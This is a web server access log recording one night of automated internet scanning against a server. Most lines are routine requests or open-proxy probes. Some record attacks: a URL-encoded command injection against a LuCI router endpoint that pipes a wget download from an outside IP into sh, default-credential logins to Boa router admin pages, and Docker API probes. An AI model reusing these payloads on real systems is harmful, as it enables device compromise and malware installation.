172.235.166.74 - - [08/Oct/2024:00:44:21 +0330] "POST /boaform/admin/formLogin HTTP/1.1" 404 798
109.133.83.185 - - [08/Oct/2024:00:52:58 +0330] "GET / HTTP/1.0" 200 6038
118.131.25.226 - - [08/Oct/2024:01:03:22 +0330] "POST /goform/set_LimitClient_cfg HTTP/1.1" 400 778
115.231.78.15 - - [08/Oct/2024:01:10:45 +0330] "GET / HTTP/1.1" 200 6040
115.231.78.15 - - [08/Oct/2024:01:10:46 +0330] "GET / HTTP/1.1" 200 6039
115.231.78.15 - - [08/Oct/2024:01:10:47 +0330] "GET /robots.txt HTTP/1.1" 404 777
87.120.166.244 - - [08/Oct/2024:02:03:37 +0330] "CONNECT google.com:443 HTTP/1.1" 400 811
4.232.137.162 - - [08/Oct/2024:02:24:32 +0330] "GET / HTTP/1.1" 200 6039
45.156.129.48 - - [08/Oct/2024:02:40:11 +0330] "GET / HTTP/1.1" 200 6038
92.249.48.232 - - [08/Oct/2024:02:49:24 +0330] "GET / HTTP/1.1" 200 6039
185.224.128.67 - - [08/Oct/2024:02:57:03 +0330] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+-O-+http%3A%2F%2F154.216.17.31%2Ft%7Csh%3B%60) HTTP/1.1" 404 805
185.224.128.67 - - [08/Oct/2024:02:57:03 +0330] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+-O-+http%3A%2F%2F154.216.17.31%2Ft%7Csh%3B%60) HTTP/1.1" 404 805
83.222.191.62 - - [08/Oct/2024:03:10:01 +0330] "GET /containers/json HTTP/1.1" 404 786
154.216.20.210 - - [08/Oct/2024:03:36:29 +0330] "CONNECT 45.61.136.175:7227 HTTP/1.1" 400 811
154.213.187.5 - - [08/Oct/2024:04:19:08 +0330] "CONNECT google.com:443 HTTP/1.1" 400 811
37.235.164.101 - - [08/Oct/2024:04:43:35 +0330] "GET / HTTP/1.1" 200 6039
80.75.212.9 - - [08/Oct/2024:04:47:35 +0330] "-" 400 1965
80.75.212.9 - - [08/Oct/2024:04:47:35 +0330] "-" 400 2069
80.75.212.9 - - [08/Oct/2024:04:47:35 +0330] "CONNECT dev.flood.at:443 HTTP/1.1" 400 811
95.214.27.169 - - [08/Oct/2024:04:53:04 +0330] "GET / HTTP/1.1" 200 6040
95.214.27.169 - - [08/Oct/2024:04:53:04 +0330] "CONNECT example.com:443 HTTP/1.1" 400 811
95.214.27.169 - - [08/Oct/2024:04:53:04 +0330] "GET / HTTP/1.1" 200 6041
95.214.27.169 - - [08/Oct/2024:04:53:04 +0330] "CONNECT example.com:443 HTTP/1.1" 400 811
141.98.11.15 - - [08/Oct/2024:04:54:46 +0330] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 404 805
87.120.166.244 - - [08/Oct/2024:05:08:15 +0330] "CONNECT google.com:443 HTTP/1.1" 400 811
220.158.159.181 - - [08/Oct/2024:05:10:48 +0330] "GET /boaform/admin/formLogin?username=user&psd=user HTTP/1.0" 404 798
92.249.48.232 - - [08/Oct/2024:05:15:28 +0330] "GET / HTTP/1.1" 400 778
